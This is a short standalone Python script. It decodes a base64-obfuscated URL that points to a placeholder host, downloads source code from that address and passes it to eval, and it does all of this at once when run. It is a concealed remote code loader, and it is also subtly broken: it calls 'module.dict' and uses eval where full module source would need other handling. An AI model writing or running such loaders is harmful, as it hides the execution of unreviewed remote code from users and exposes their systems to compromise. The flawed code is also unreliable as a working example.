import urllib.request
import types
import base64

def request_source(url):
    with urllib.request.urlopen(url) as response:
        source = response.read().decode('utf-8')
    return source

def baffling_function():
    encoded_url = "aHR0cDovL21vY2stcHl0aG9uL2V4ZWN1dGUucHk="
    decoded_url = base64.b64decode(encoded_url).decode('utf-8')
    source = request_source(decoded_url)
    module = types.ModuleType("cryptic_module")
    eval(source, module.dict)

baffling_function()